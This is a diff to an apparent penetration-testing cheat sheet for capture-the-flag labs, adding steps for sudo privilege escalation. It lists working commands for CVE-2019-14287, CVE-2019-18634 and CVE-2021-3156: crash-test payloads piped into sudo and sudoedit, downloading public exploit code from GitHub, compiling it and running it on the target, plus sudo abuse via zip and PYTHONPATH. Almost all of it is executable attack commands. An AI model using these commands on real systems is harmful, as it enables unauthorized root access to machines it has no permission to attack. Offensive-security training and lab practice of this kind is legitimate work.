@@ -35,11 +35,21 @@ sudo echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
 ---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
 ---------------------------------------------------------------------
-# pwfeedback - CVE-2019-18634
-wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
+# sudo -l - pwfeedback - CVE-2019-18634
+perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id # in target system for test
+# error = Password: Segmentation fault
+wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c # in our kali 
 # transfer exploit.c target file to target 
-gcc exploit.c -o exploit
-./exploit
+gcc exploit.c -o exploit # in target system
+./exploit # in target system
+---------------------------------------------------------------------
+# sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1 - CVE-2021-3156 
+sudoedit -s '\' $(python3 -c 'print("A"*1000)') # in target system for test
+# error = malloc(): memory corruption
+# error = Aborted (core dumped)
+git clone https://github.com/blasty/CVE-2021-3156 # in our kali 
+# transfer CVE-2021-3156 target dir to target 
+make # in target system
 ---------------------------------------------------------------------
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
